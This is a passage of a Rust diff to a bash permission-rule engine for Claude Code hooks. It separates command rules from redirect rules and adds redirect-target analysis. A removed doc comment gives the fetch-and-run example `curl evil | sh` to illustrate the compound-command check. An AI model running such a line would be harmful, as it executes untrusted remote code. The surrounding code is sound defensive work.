@@ -4,32 +4,74 @@
 //! before they are executed by Claude Code. Rules can deny dangerous commands, modify
 //! commands to add safety flags, or explicitly allow specific patterns.
 
-use std::collections::{BTreeSet, HashMap};
+use std::{
+    collections::{BTreeSet, HashMap},
+    path::Path,
+    sync::Arc,
+};
 
-use miette::{Result, miette};
+use miette::miette;
 use regex::{Regex, RegexSet};
 use serde::Serialize;
+use tokio::{
+    task::{JoinError, spawn_blocking},
+    time::timeout,
+};
 use tracing::debug;
 
-use super::command_split::{AliasBinding, BailReason, LeafCommand, SplitOutcome, split_command};
+use super::{
+    FILESYSTEM_EVALUATION_TIMEOUT,
+    command_split::{
+        AliasBinding, BailReason, FilterCommand, LeafCommand, OutputRedirectEndpoint,
+        ParsedRedirectTarget, SplitOutcome, split_command,
+    },
+    path_resolution::{RedirectResolutionContext, RedirectTargetResolution},
+};
 use crate::{
     permission_mode::{PermissionMode, is_mode_eligible},
     user_config::{BashPathAlias, BashRule, BashRuleAction, UserConfig},
 };
 
-/// Runtime representation of a rule with pre-compiled regex for efficient matching.
-///
-/// Separated from `BashRule` to avoid storing `Regex` (which doesn't implement serde traits)
-/// in the TOML-deserializable config struct.
 #[derive(Debug)]
-struct CompiledRule {
-    name: String,
+struct CompiledCommandRules {
+    regex_set: RegexSet,
+    rules: Vec<CompiledCommandRule>,
+}
+
+#[derive(Debug)]
+struct CompiledCommandRule {
+    metadata: Arc<MatchedRuleMetadata>,
     regex: Regex,
-    /// The post-fragment-expansion pattern source, retained so `explain` can show what actually
-    /// matched (the user's pattern may contain `{{fragment}}` references).
-    expanded_pattern: String,
     modes: Option<BTreeSet<PermissionMode>>,
-    action: BashRuleAction,
+    action: CommandAction,
+}
+
+#[derive(Debug)]
+enum CommandAction {
+    Allow,
+    Deny(String),
+    Modify(String),
+    Ask,
+    ArgumentFilter {
+        remove: Option<Vec<String>>,
+        add: Option<Vec<String>>,
+        replace: Option<HashMap<String, String>>,
+        reason: Option<String>,
+    },
+}
+
+#[derive(Debug)]
+struct CompiledRedirectRules {
+    regex_set: RegexSet,
+    rules: Vec<CompiledRedirectRule>,
+}
+
+#[derive(Debug)]
+struct CompiledRedirectRule {
+    metadata: Arc<MatchedRuleMetadata>,
+    regex: Regex,
+    modes: Option<BTreeSet<PermissionMode>>,
+    allow_local: bool,
 }
 
 /// Includes `rule_name` in all match variants to support logging and debugging.
@@ -58,13 +100,12 @@ pub enum RuleResult {
     NoMatch,
 }
 
-/// Engine for evaluating bash command rules using RegexSet for O(1) parallel pattern matching.
-///
-/// Applies first-match-wins semantics: the first regex that matches determines the action.
+/// Command and redirect rules use independent first-match-wins domains so neither policy can
+/// authorize or shadow the other.
 #[derive(Debug)]
 pub struct BashRuleEngine {
-    regex_set: RegexSet,
-    rules: Vec<CompiledRule>,
+    command_rules: CompiledCommandRules,
+    redirect_rules: CompiledRedirectRules,
     path_aliases: BTreeSet<BashPathAlias>,
 }
 
@@ -158,7 +199,7 @@ pub(crate) fn classify_fragment_error(message: &str) -> RuleDiagnosticKind {
 pub(crate) fn expand_fragments(
     pattern: &str,
     fragments: &HashMap<String, String>,
-) -> Result<String> {
+) -> miette::Result<String> {
     let fragment_pattern =
         Regex::new(r"\{\{([a-zA-Z_][a-zA-Z0-9_-]*)\}\}").expect("Fragment regex pattern is valid");
 
@@ -198,7 +239,7 @@ impl FragmentExpander<'_> {
     /// expand into an enormous regex. Set generously so no plausible hand-written set trips it.
     const MAX_EXPANSIONS: usize = 256;
 
-    fn expand(&mut self, text: &str) -> Result<String> {
+    fn expand(&mut self, text: &str) -> miette::Result<String> {
         if self.active.len() > Self::MAX_DEPTH {
             return Err(miette!(
                 "Pattern fragment expansion exceeded maximum depth of {}. \
@@ -297,7 +338,6 @@ pub(crate) fn default_fragments() -> HashMap<String, String> {
     fragments
 }
 
-/// One rule's contribution to an [`explain`](BashRuleEngine::explain) trace.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize)]
 pub(crate) struct RuleMatchExplanation {
     pub rule_name: String,
@@ -306,7 +346,20 @@ pub(crate) struct RuleMatchExplanation {
     pub action_summary: String,
 }
 
-/// How one leaf of a command was evaluated.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
+pub(crate) struct RedirectEndpointTrace {
+    pub original_target: String,
+    pub kind: &'static str,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub match_text: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub is_local: Option<bool>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub matched: Option<RuleMatchExplanation>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub failure: Option<String>,
+}
+
 #[derive(Debug, Clone, PartialEq, Eq, Serialize)]
 pub(crate) struct SubCommandTrace {
     pub original: String,
@@ -317,11 +370,18 @@ pub(crate) struct SubCommandTrace {
     pub bindings: Vec<AliasBinding>,
     #[serde(skip_serializing_if = "Option::is_none")]
     pub requires_confirmation: Option<String>,
-    pub real_file_write: bool,
+    #[serde(skip_serializing_if = "Vec::is_empty")]
+    pub output_redirects: Vec<RedirectEndpointTrace>,
     pub matched: Option<RuleMatchExplanation>,
 }
 
-/// A full explanation of how [`BashRuleEngine::apply_rules_compound`] evaluates a command.
+/// Keeps rewritten text paired with its reason after a fail-closed `Asked` result loses both.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
+pub(crate) struct RewrittenBailTrace {
+    pub command: String,
+    pub reason: BailReason,
+}
+
 #[derive(Debug, Clone, PartialEq, Eq, Serialize)]
 pub(crate) struct CommandTrace {
     pub original: String,
@@ -330,29 +390,320 @@ pub(crate) struct CommandTrace {
     pub bindings: Vec<AliasBinding>,
     /// Per-leaf evaluation in execution order; empty when `bail` is set.
     pub sub_commands: Vec<SubCommandTrace>,
+    /// Kept separately so explain can show policy applied after a Modify rewrite or ArgumentFilter recheck.
+    #[serde(skip_serializing_if = "Vec::is_empty")]
+    pub rewritten_sub_commands: Vec<SubCommandTrace>,
+    /// Preserves diagnostics when an unanalyzable rewrite is downgraded to confirmation.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub rewritten_bail: Option<RewrittenBailTrace>,
     /// Set when the command could not be analyzed and fell back to whole-command evaluation.
     pub bail: Option<BailReason>,
     pub final_result: RuleResult,
+    #[serde(skip_serializing_if = "Vec::is_empty")]
+    pub contributors: Vec<String>,
 }
 
-/// A one-line, human-readable summary of a rule's action for explain output.
-fn action_summary(action: &BashRuleAction) -> String {
-    match action {
-        BashRuleAction::Allow => "Allow".to_string(),
-        BashRuleAction::Deny { value } => format!("Deny: {value}"),
-        BashRuleAction::Modify { value } => format!("Modify → {value}"),
-        BashRuleAction::Ask => "Ask".to_string(),
-        BashRuleAction::ArgumentFilter { reason, .. } => match reason {
-            Some(reason) => format!("ArgumentFilter ({reason})"),
-            None => "ArgumentFilter".to_string(),
-        },
+#[derive(Debug, PartialEq, Eq)]
+struct MatchedRuleMetadata {
+    rule_name: String,
+    expanded_pattern: String,
+    action_summary: String,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct MatchedCommandRule {
+    metadata: Arc<MatchedRuleMetadata>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct MatchedRedirectRule {
+    metadata: Arc<MatchedRuleMetadata>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) enum CommandDecision {
+    NoMatch,
+    Allow {
+        rule: MatchedCommandRule,
+    },
+    Deny {
+        rule: MatchedCommandRule,
+        reason: String,
+    },
+    Modify {
+        rule: MatchedCommandRule,
+        new_command: String,
+    },
+    Ask {
+        rule: MatchedCommandRule,
+    },
+    ArgumentFilter {
+        rule: MatchedCommandRule,
+        new_command: String,
+        reason: Option<String>,
+    },
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum EndpointFailureStage {
+    StaticAnalysis,
+    RuntimeResolution,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct ResolvedRedirectTarget {
+    match_text: String,
+    is_local: bool,
+    kind: RedirectEndpointKind,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) enum FilesystemAnalysis {
+    Resolved {
+        target: ResolvedRedirectTarget,
+        matched_rule: Option<MatchedRedirectRule>,
+    },
+    Failed {
+        stage: EndpointFailureStage,
+        reason: String,
+    },
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) enum EndpointAnalysis {
+    Descriptor {
+        original_target: String,
+        match_text: String,
+        matched_rule: Option<MatchedRedirectRule>,
+    },
+    Filesystem {
+        original_target: String,
+        resolution: FilesystemAnalysis,
+    },
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum RedirectAuthorizationView<'a> {
+    Authorized(&'a MatchedRedirectRule),
+    Unmatched,
+    Unresolvable,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct LeafIdentity {
+    original: String,
+    alias_expanded: Option<String>,
+    normalized: String,
+    bindings: Vec<AliasBinding>,
+    requires_confirmation: Option<String>,
+    command_shape: Option<FilterCommand>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) enum EndpointCoverage {
+    Skipped,
+    Analyzed(Vec<EndpointAnalysis>),
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct PolicyLeafAnalysis {
+    identity: LeafIdentity,
+    command: CommandDecision,
+    endpoints: EndpointCoverage,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct RedirectLeafAnalysis {
+    identity: LeafIdentity,
+    endpoints: Vec<EndpointAnalysis>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) enum BailDecision {
+    Deny {
+        rule: MatchedCommandRule,
+        reason: String,
+    },
+    NoMatch,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) enum PolicyAnalysis {
+    Bail {
+        command: String,
+        reason: BailReason,
+        decision: BailDecision,
+    },
+    Leaves(Vec<PolicyLeafAnalysis>),
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) enum RedirectCheckAnalysis {
+    Bail { command: String, reason: BailReason },
+    Leaves(Vec<RedirectLeafAnalysis>),
+}
+
+/// `evaluate_sync` constructs this check only when the recheck outcome is `Modify`.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) enum FilterContinuation {
+    None,
+    ModifyRedirectCheck(RedirectCheckAnalysis),
+}
+
+/// Each non-`None` variant is valid only beside the original source outcome that names it.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) enum OriginalContinuation {
+    None,
+    ModifyRedirectCheck(RedirectCheckAnalysis),
+    ArgumentFilterRecheck {
+        recheck: PolicyAnalysis,
+        continuation: FilterContinuation,
+    },
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct Evaluation {
+    original: PolicyAnalysis,
+    continuation: OriginalContinuation,
+}
+
+#[derive(Debug)]
+pub(crate) struct EvaluationContext {
+    cwd: String,
+    mode: Option<PermissionMode>,
+    resolution: RedirectResolutionContext,
+}
+
+impl EvaluationContext {
+    pub(crate) fn new(cwd: &str, mode: Option<PermissionMode>) -> Self {
+        let home = std::env::var_os("HOME");
+        Self {
+            cwd: cwd.to_string(),
+            mode,
+            resolution: RedirectResolutionContext::new(
+                Path::new(cwd),
+                home.as_deref().map(Path::new),
+            ),
+        }
+    }
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum EvaluationPurpose {
+    Decision,
+    Diagnostics,
+}
+
+#[derive(Debug)]
+pub(crate) enum LiveEvaluationFailure {
+    Timeout,
+    Join(JoinError),
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum PolicyOutcome<'a> {
+    Allow {
+        rule: &'a MatchedCommandRule,
+    },
+    Deny {
+        rule: &'a MatchedCommandRule,
+        reason: &'a str,
+    },
+    Modify {
+        rule: &'a MatchedCommandRule,
+        new_command: &'a str,
+    },
+    Ask {
+        rule: &'a MatchedCommandRule,
+    },
+    ArgumentFilter {
+        rule: &'a MatchedCommandRule,
+        new_command: &'a str,
+        reason: Option<&'a str>,
+    },
+    NoMatch,
+}
+
+impl CommandAction {
+    fn summary(&self) -> String {
+        match self {
+            Self::Allow => "Allow".to_string(),
+            Self::Deny(reason) => format!("Deny: {reason}"),
+            Self::Modify(command) => format!("Modify → {command}"),
+            Self::Ask => "Ask".to_string(),
+            Self::ArgumentFilter { reason, .. } => match reason {
+                Some(reason) => format!("ArgumentFilter ({reason})"),
+                None => "ArgumentFilter".to_string(),
+            },
+        }
+    }
+}
+
+fn redirect_action_summary(allow_local: bool) -> String {
+    if allow_local {
+        "AllowRedirect (local only)".to_string()
+    } else {
+        "AllowRedirect".to_string()
+    }
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum RedirectEndpointKind {
+    Descriptor,
+    Filesystem,
+    DeviceOrSpecial,
+}
+
+impl RedirectEndpointKind {
+    pub(crate) fn label(self) -> &'static str {
+        match self {
+            Self::Descriptor => "descriptor",
+            Self::Filesystem => "filesystem",
+            Self::DeviceOrSpecial => "device or special file",
+        }
+    }
+
+    pub(crate) fn is_filesystem(self) -> bool {
+        matches!(self, Self::Filesystem)
+    }
+}
+
+impl CompiledCommandRules {
+    fn first_match(
+        &self,
+        text: &str,
+        mode: Option<PermissionMode>,
+    ) -> Option<&CompiledCommandRule> {
+        self.regex_set.matches(text).iter().find_map(|index| {
+            let rule = &self.rules[index];
+            debug_assert!(rule.regex.is_match(text));
+            is_mode_eligible(rule.modes.as_ref(), mode).then_some(rule)
+        })
+    }
+}
+
+impl CompiledRedirectRules {
+    fn first_match(
+        &self,
+        text: &str,
+        mode: Option<PermissionMode>,
+        is_filesystem: bool,
+        is_local: bool,
+    ) -> Option<&CompiledRedirectRule> {
+        self.regex_set.matches(text).iter().find_map(|index| {
+            let rule = &self.rules[index];
+            debug_assert!(rule.regex.is_match(text));
+            (is_mode_eligible(rule.modes.as_ref(), mode)
+                && (!rule.allow_local || is_filesystem && is_local))
+                .then_some(rule)
+        })
     }
 }
 
 impl BashRuleEngine {
     /// Compiles rules with pattern fragment expansion, logging and skipping any rule that fails to
     /// expand or compile (fail-open per rule, preserving the hook hot path's behavior).
-    pub fn from_config(config: UserConfig) -> Result<Self> {
+    pub fn from_config(config: UserConfig) -> miette::Result<Self> {
         let (mut engine, diagnostics) = Self::compile_with_diagnostics(
             config.bash_rules.unwrap_or_default(),
             config.pattern_fragments,
@@ -376,15 +727,16 @@ impl BashRuleEngine {
     pub(crate) fn compile_with_diagnostics(
         rules: Vec<BashRule>,
         user_fragments: Option<HashMap<String, String>>,
-    ) -> Result<(Self, Vec<RuleDiagnostic>)> {
-        // Merge default fragments with user fragments (user takes precedence).
+    ) -> miette::Result<(Self, Vec<RuleDiagnostic>)> {
         let mut fragments = default_fragments();
-        if let Some(user_frags) = user_fragments {
-            fragments.extend(user_frags);
+        if let Some(user_fragments) = user_fragments {
+            fragments.extend(user_fragments);
         }
 
-        let mut compiled_rules = Vec::new();
-        let mut patterns = Vec::new();
+        let mut command_patterns = Vec::new();
+        let mut command_rules = Vec::new();
+        let mut redirect_patterns = Vec::new();
+        let mut redirect_rules = Vec::new();
         let mut diagnostics = Vec::new();
 
         for rule in rules {
@@ -401,18 +753,8 @@ impl BashRuleEngine {
                     continue;
                 }
             };
-
-            match Regex::new(&expanded_pattern) {
-                Ok(regex) => {
-                    patterns.push(expanded_pattern.clone());
-                    compiled_rules.push(CompiledRule {
-                        name: rule.name,
-                        regex,
-                        expanded_pattern,
-                        modes: rule.modes,
-                        action: rule.action,
-                    });
-                }
+            let regex = match Regex::new(&expanded_pattern) {
+                Ok(regex) => regex,
                 Err(error) => {
                     diagnostics.push(RuleDiagnostic {
                         rule_name: rule.name,
@@ -420,289 +762,812 @@ impl BashRuleEngine {
                         kind: RuleDiagnosticKind::InvalidRegex,
                         message: error.to_string(),
                     });
+                    continue;
                 }
-            }
-        }
+            };
 
-        let regex_set = RegexSet::new(patterns)
-            .map_err(|e| miette!("Failed to build RegexSet from patterns: {}", e))?;
+            let action = match rule.action {
+                BashRuleAction::Allow => CommandAction::Allow,
+                BashRuleAction::Deny { value } => CommandAction::Deny(value),
+                BashRuleAction::Modify { value } => CommandAction::Modify(value),
+                BashRuleAction::Ask => CommandAction::Ask,
+                BashRuleAction::ArgumentFilter {
+                    remove,
+                    add,
+                    replace,
+                    reason,
+                } => CommandAction::ArgumentFilter {
+                    remove,
+                    add,
+                    replace,
+                    reason,
+                },
+                BashRuleAction::AllowRedirect { allow_local } => {
+                    redirect_patterns.push(expanded_pattern.clone());
+                    redirect_rules.push(CompiledRedirectRule {
+                        metadata: Arc::new(MatchedRuleMetadata {
+                            rule_name: rule.name,
+                            expanded_pattern,
+                            action_summary: redirect_action_summary(allow_local),
+                        }),
+                        regex,
+                        modes: rule.modes,
+                        allow_local,
+                    });
+                    continue;
+                }
+            };
+            command_patterns.push(expanded_pattern.clone());
+            command_rules.push(CompiledCommandRule {
+                metadata: Arc::new(MatchedRuleMetadata {
+                    rule_name: rule.name,
+                    expanded_pattern,
+                    action_summary: action.summary(),
+                }),
+                regex,
+                modes: rule.modes,
+                action,
+            });
+        }
 
         Ok((
             Self {
-                regex_set,
-                rules: compiled_rules,
+                command_rules: CompiledCommandRules {
+                    regex_set: RegexSet::new(command_patterns).map_err(|error| {
+                        miette!("Failed to build command RegexSet from patterns: {error}")
+                    })?,
+                    rules: command_rules,
+                },
+                redirect_rules: CompiledRedirectRules {
+                    regex_set: RegexSet::new(redirect_patterns).map_err(|error| {
+                        miette!("Failed to build redirect RegexSet from patterns: {error}")
+                    })?,
+                    rules: redirect_rules,
+                },
                 path_aliases: BTreeSet::new(),
             },
             diagnostics,
         ))
     }
 
-    /// Index of the first mode-eligible rule (in declaration order) whose regex matches, if any.
-    fn first_match_index(&self, command: &str, mode: Option<PermissionMode>) -> Option<usize> {
-        self.regex_set
-            .matches(command)
-            .iter()
-            .find(|index| is_mode_eligible(self.rules[*index].modes.as_ref(), mode))
-    }
-
-    pub fn apply_rules(&self, command: &str, mode: Option<PermissionMode>) -> RuleResult {
-        if let Some(first_match_idx) = self.first_match_index(command, mode) {
-            let rule = &self.rules[first_match_idx];
-
-            debug!(
-                rule_name = %rule.name,
-                command = %command,
-                "Bash rule matched"
-            );
-
-            return match &rule.action {
-                BashRuleAction::Deny { value } => RuleResult::Denied {
-                    rule_name: rule.name.clone(),
-                    reason: value.clone(),
-                },
-                BashRuleAction::Modify { value } => {
-                    let captures = rule
-                        .regex
-                        .captures(command)
-                        .expect("Invariant violation: RegexSet and Regex desynchronized");
-                    let new_command = expand_captures(&captures, value);
-                    debug!(
-                        rule_name = %rule.name,
-                        original = %command,
-                        modified = %new_command,
-                        "Command modified by rule"
-                    );
-                    RuleResult::Modified {
-                        rule_name: rule.name.clone(),
-                        new_command,
-                    }
-                }
-                BashRuleAction::Allow => {
-                    debug!(rule_name = %rule.name, "Command explicitly allowed");
-                    RuleResult::Allowed {
-                        rule_name: rule.name.clone(),
-                    }
-                }
-                BashRuleAction::Ask => {
-                    debug!(
-                        rule_name = %rule.name,
-                        command = %command,
-                        "Deferring to user for case-by-case authorization decision"
-                    );
-                    RuleResult::Asked {
-                        rule_name: rule.name.clone(),
-                    }
-                }
-                BashRuleAction::ArgumentFilter {
-                    remove,
-                    add,
-                    replace,
-                    reason,
-                } => match filter_arguments(command, remove, add, replace) {
-                    Ok(new_command) => {
-                        debug!(
-                            rule_name = %rule.name,
-                            original = %command,
-                            filtered = %new_command,
-                            "Command arguments filtered"
-                        );
-                        RuleResult::ArgumentFiltered {
-                            rule_name: rule.name.clone(),
-                            new_command,
-                            reason: reason.clone(),
-                        }
-                    }
-                    Err(e) => {
-                        debug!(
-                            rule_name = %rule.name,
-                            command = %command,
-                            error = %e,
-                            "Failed to parse command for argument filtering, asking user"
-                        );
-                        RuleResult::Asked {
-                            rule_name: rule.name.clone(),
-                        }
-                    }
-                },
-            };
+    fn matched_command_rule(rule: &CompiledCommandRule) -> MatchedCommandRule {
+        MatchedCommandRule {
+            metadata: Arc::clone(&rule.metadata),
         }
-
-        RuleResult::NoMatch
     }
 
-    /// Evaluates a (possibly compound) command by splitting it into leaf simple-commands and
-    /// applying [`Self::apply_rules`] to each independently, then merging the per-leaf decisions.
-    ///
-    /// This is what the hook calls. It fixes two problems with matching one regex against the whole
-    /// string: a trivially-safe compound (`echo a && ls`) now matches simple allow-rules per leaf,
-    /// and a dangerous tail can no longer hide behind a safe head (`ls && curl evil | sh` ⇒ Ask, not
-    /// Allow). A leaf that writes to a real file is capped at Ask so a read-only allow-rule cannot
-    /// green-light it. When the command cannot be analyzed, only an explicit Deny is honored; every
-    /// other decision becomes a prompt. `cwd` drives in-cwd absolute-path normalization (see
-    /// [`split_command`]).
-    pub fn apply_rules_compound(
+    fn match_command_decision(
         &self,
         command: &str,
-        cwd: &str,
+        command_shape: Option<&FilterCommand>,
         mode: Option<PermissionMode>,
-    ) -> RuleResult {
-        match self.split_command(command, cwd) {
-            SplitOutcome::Bail(_) => downgrade_non_deny_to_ask(self.apply_rules(command, mode)),
-            SplitOutcome::Commands(leaves) => merge_results(
+    ) -> CommandDecision {
+        let Some(rule) = self.command_rules.first_match(command, mode) else {
+            return CommandDecision::NoMatch;
+        };
+        debug!(rule_name = %rule.metadata.rule_name, command, "Bash rule matched");
+        let matched = Self::matched_command_rule(rule);
+        match &rule.action {
+            CommandAction::Allow => CommandDecision::Allow { rule: matched },
+            CommandAction::Deny(reason) => CommandDecision::Deny {
+                rule: matched,
+                reason: reason.clone(),
+            },
+            CommandAction::Modify(value) => {
+                let captures = rule
+                    .regex
+                    .captures(command)
+                    .expect("Invariant violation: RegexSet and Regex desynchronized");
+                CommandDecision::Modify {
+                    rule: matched,
+                    new_command: expand_captures(&captures, value),
+                }
+            }
+            CommandAction::Ask => CommandDecision::Ask { rule: matched },
+            CommandAction::ArgumentFilter {
+                remove,
+                add,
+                replace,
+                reason,
+            } => match filter_arguments(command, command_shape, remove, add, replace) {
+                Ok(new_command) => CommandDecision::ArgumentFilter {
+                    rule: matched,
+                    new_command,
+                    reason: reason.clone(),
+                },
+                Err(error) => {
+                    debug!(
+                        rule_name = %rule.metadata.rule_name,
+                        command,
+                        error = %error,
+                        "Failed to filter command arguments, asking user"
+                    );
+                    CommandDecision::Ask { rule: matched }
+                }
+            },
+        }
+    }
+
+    pub(crate) fn evaluate_sync(
+        &self,
+        command: &str,
+        context: &EvaluationContext,
+        purpose: EvaluationPurpose,
+    ) -> Evaluation {
+        let original = self.evaluate_original(command, context, purpose);
+        let continuation = match original.outcome() {
+            PolicyOutcome::Modify { new_command, .. } => OriginalContinuation::ModifyRedirectCheck(
+                self.analyze_redirect_check(new_command, context),
+            ),
+            PolicyOutcome::ArgumentFilter { new_command, .. } => {
+                let recheck = self.evaluate_original(new_command, context, purpose);
+                let continuation = match recheck.outcome() {
+                    PolicyOutcome::Modify { new_command, .. } => {
+                        FilterContinuation::ModifyRedirectCheck(
+                            self.analyze_redirect_check(new_command, context),
+                        )
+                    }
+                    _ => FilterContinuation::None,
+                };
+                OriginalContinuation::ArgumentFilterRecheck {
+                    recheck,
+                    continuation,
+                }
+            }
+            _ => OriginalContinuation::None,
+        };
+        Evaluation {
+            original,
+            continuation,
+        }
+    }
+
+    pub(crate) fn evaluate_original(
+        &self,
+        command: &str,
+        context: &EvaluationContext,
+        purpose: EvaluationPurpose,
+    ) -> PolicyAnalysis {
+        match split_command(command, &context.cwd, &self.path_aliases) {
+            SplitOutcome::Bail(reason) => {
+                let decision = match self.match_command_decision(command, None, context.mode) {
+                    CommandDecision::Deny { rule, reason } => BailDecision::Deny { rule, reason },
+                    _ => BailDecision::NoMatch,
+                };
+                PolicyAnalysis::Bail {
+                    command: command.to_string(),
+                    reason,
+                    decision,
+                }
+            }
+            SplitOutcome::Commands(leaves) => PolicyAnalysis::Leaves(
                 leaves
-                    .iter()
-                    .map(|leaf| self.evaluate_leaf(leaf, mode))
+                    .into_iter()
+                    .map(|leaf| self.analyze_policy_leaf(leaf, context, purpose))
                     .collect(),
             ),
         }
     }
 
-    /// Produces a full trace of how [`Self::apply_rules_compound`] evaluates `command`: the leaf
-    /// split, each leaf's normalized text and matching rule, and the merged final decision. Used by
-    /// `moriarty test bash-rules --explain`; the result mirrors `apply_rules_compound` exactly.
-    pub(crate) fn explain(
+    fn analyze_policy_leaf(
         &self,
+        leaf: LeafCommand,
+        context: &EvaluationContext,
+        purpose: EvaluationPurpose,
+    ) -> PolicyLeafAnalysis {
+        let command = self.match_command_decision(
+            &leaf.match_text,
+            leaf.filter_command.as_ref(),
+            context.mode,
+        );
+        let (identity, output_redirects) = leaf_identity_and_redirects(leaf);
+        let analyze_endpoints = matches!(purpose, EvaluationPurpose::Diagnostics)
+            || matches!(command, CommandDecision::Allow { .. });
+        let endpoints = if analyze_endpoints {
+            EndpointCoverage::Analyzed(
+                output_redirects
+                    .into_iter()
+                    .map(|endpoint| self.analyze_endpoint(endpoint, context))
+                    .collect(),
+            )
+        } else {
+            EndpointCoverage::Skipped
+        };
+        PolicyLeafAnalysis {
+            identity,
+            command,
+            endpoints,
+        }
+    }
+
+    fn analyze_redirect_check(
+        &self,
+        command: &str,
+        context: &EvaluationContext,
+    ) -> RedirectCheckAnalysis {
+        match split_command(command, &context.cwd, &self.path_aliases) {
+            SplitOutcome::Bail(reason) => RedirectCheckAnalysis::Bail {
+                command: command.to_string(),
+                reason,
+            },
+            SplitOutcome::Commands(leaves) => RedirectCheckAnalysis::Leaves(
+                leaves
+                    .into_iter()
+                    .map(|leaf| {
+                        let (identity, output_redirects) = leaf_identity_and_redirects(leaf);
+                        RedirectLeafAnalysis {
+                            endpoints: output_redirects
+                                .into_iter()
+                                .map(|endpoint| self.analyze_endpoint(endpoint, context))
+                                .collect(),
+                            identity,
+                        }
+                    })
+                    .collect(),
+            ),
+        }
+    }
+
+    fn analyze_endpoint(
+        &self,
+        endpoint: OutputRedirectEndpoint,
+        context: &EvaluationContext,
+    ) -> EndpointAnalysis {
+        match endpoint.target {
+            ParsedRedirectTarget::Descriptor { match_text } => {
+                let matched_rule = self.match_redirect_rule(
+                    &match_text,
+                    context.mode,
+                    RedirectEndpointKind::Descriptor,
+                    false,
+                );
+                EndpointAnalysis::Descriptor {
+                    original_target: endpoint.original_target,
+                    match_text,
+                    matched_rule,
+                }
+            }
+            ParsedRedirectTarget::Unresolvable { reason } => EndpointAnalysis::Filesystem {
+                original_target: endpoint.original_target,
+                resolution: FilesystemAnalysis::Failed {
+                    stage: EndpointFailureStage::StaticAnalysis,
+                    reason,
+                },
+            },
+            ParsedRedirectTarget::Filesystem {
+                path,
+                expand_home_tilde,
+            } => match context.resolution.resolve(&path, expand_home_tilde) {
+                Ok(RedirectTargetResolution {
+                    match_text,
+                    is_local,
+                    is_device_or_special,
+                    ..
+                }) => {
+                    let kind = if is_device_or_special {
+                        RedirectEndpointKind::DeviceOrSpecial
+                    } else {
+                        RedirectEndpointKind::Filesystem
+                    };
+                    let matched_rule =
+                        self.match_redirect_rule(&match_text, context.mode, kind, is_local);
+                    EndpointAnalysis::Filesystem {
+                        original_target: endpoint.original_target,
+                        resolution: FilesystemAnalysis::Resolved {
+                            target: ResolvedRedirectTarget {
+                                match_text,
+                                is_local,
+                                kind,
+                            },
+                            matched_rule,
+                        },
+                    }
+                }
+                Err(error) => EndpointAnalysis::Filesystem {
+                    original_target: endpoint.original_target,
+                    resolution: FilesystemAnalysis::Failed {
+                        stage: EndpointFailureStage::RuntimeResolution,
+                        reason: format!("failed to resolve redirect target: {error}"),
+                    },
+                },
+            },
+        }
+    }
+
+    fn match_redirect_rule(
+        &self,
+        match_text: &str,
+        mode: Option<PermissionMode>,
+        kind: RedirectEndpointKind,
+        is_local: bool,
+    ) -> Option<MatchedRedirectRule> {
+        self.redirect_rules
+            .first_match(match_text, mode, kind.is_filesystem(), is_local)
+            .map(|rule| MatchedRedirectRule {
+                metadata: Arc::clone(&rule.metadata),
+            })
+    }
+
+    pub(crate) async fn evaluate_live(
+        self: &Arc<Self>,
         command: &str,
         cwd: &str,
         mode: Option<PermissionMode>,
-    ) -> CommandTrace {
-        match self.split_command(command, cwd) {
-            SplitOutcome::Bail(reason) => CommandTrace {
-                original: command.to_string(),
-                bindings: Vec::new(),
-                sub_commands: Vec::new(),
-                bail: Some(reason),
-                final_result: downgrade_non_deny_to_ask(self.apply_rules(command, mode)),
-            },
-            SplitOutcome::Commands(leaves) => {
-                let mut sub_commands = Vec::with_capacity(leaves.len());
-                let mut results = Vec::with_capacity(leaves.len());
-                let mut bindings = Vec::new();
-                for leaf in &leaves {
-                    for binding in &leaf.bindings {
-                        if !bindings.contains(binding) {
-                            bindings.push(binding.clone());
-                        }
-                    }
-                    sub_commands.push(SubCommandTrace {
-                        original: leaf.original.clone(),
-                        alias_expanded: leaf.alias_expanded.clone(),
-                        normalized: leaf.match_text.clone(),
-                        bindings: leaf.bindings.clone(),
-                        requires_confirmation: leaf.requires_confirmation.clone(),
-                        real_file_write: leaf.real_file_write,
-                        matched: self.match_explanation(&leaf.match_text, mode),
-                    });
-                    results.push(self.evaluate_leaf(leaf, mode));
-                }
+    ) -> Result<Evaluation, LiveEvaluationFailure> {
+        let engine = Arc::clone(self);
+        let command = command.to_string();
+        let cwd = cwd.to_string();
+        match timeout(
+            FILESYSTEM_EVALUATION_TIMEOUT,
+            spawn_blocking(move || {
+                let context = EvaluationContext::new(&cwd, mode);
